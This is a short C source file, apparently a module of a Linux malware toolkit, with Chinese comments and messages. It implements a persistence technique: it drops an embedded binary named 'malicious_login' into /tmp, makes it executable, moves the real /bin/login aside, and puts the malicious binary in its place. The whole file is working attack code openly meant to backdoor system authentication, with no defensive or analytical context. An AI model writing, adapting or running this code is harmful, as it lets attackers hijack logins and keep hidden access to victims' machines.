#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"

#ifdef BINARY_REPLACEMENT_MOD
void setup_binary_replacement_persistence() {
    printf("设置二进制文件替换持久化...\n");
    const char* malicious_path = "/tmp/malicious_login";
    const char* target_path = "/bin/login";
    const char* backup_path = "/bin/login.bak";
    
    // 释放恶意程序
    release_file(malicious_path, malicious_login, malicious_login_size);
    chmod(malicious_path, 0755); // 确保恶意程序可执行
    
    // 备份原始的 login 程序
    if (rename(target_path, backup_path) != 0) {
        perror("无法备份原始 /bin/login");
        return;
    }
    
    // 替换原始的 login 程序
    if (rename(malicious_path, target_path) != 0) {
        perror("无法替换 /bin/login");
        // 恢复备份
        rename(backup_path, target_path);
    } else {
        printf("持久化命令已添加到二进制文件替换。\n");
    }
}
#endif